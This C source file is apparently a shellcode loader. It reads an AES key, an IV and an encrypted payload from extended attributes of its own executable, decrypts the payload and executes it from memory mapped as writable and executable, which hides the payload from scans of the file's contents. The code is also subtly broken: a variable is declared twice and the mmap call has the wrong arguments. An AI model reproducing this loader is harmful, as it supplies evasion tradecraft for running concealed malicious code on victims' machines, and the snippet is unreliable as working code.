#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>

#include "aes.h"

int main(void)
{
    struct AES_ctx ctx; 
    int (*func)();
    size_t                     sizep;
    char                       *data;
    char                     key[16]; 
    char                      iv[16]; 
    char                 payol[1024]; 
    char           *attr0 = "user.0"; 
    char           *attr1 = "user.1"; 
    char           *attr2 = "user.2"; 
    char   *pathn = "/proc/self/exe";

    sizep = getxattr(pathn, attr0, key, 16); 
    if (sizep != 16)
    {
        exit(1); 
    }
    getxattr(pathn, attr1, iv, 16);  
    getxattr(pathn, attr2, payol, 1024); 

    AES_init_ctx_iv(&ctx, (uint8_t *)key, (uint8_t *)iv);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t *)payol, 1024); 

    char *data = mmap(NULL, 1024, PROT_EXEC |PROT_READ|PROT_WRITE, 0, 0);
    memcpy(data, payol, 1024);
    func = (int (*)()) data;
    (int)(*func)();
    return 0; 
}
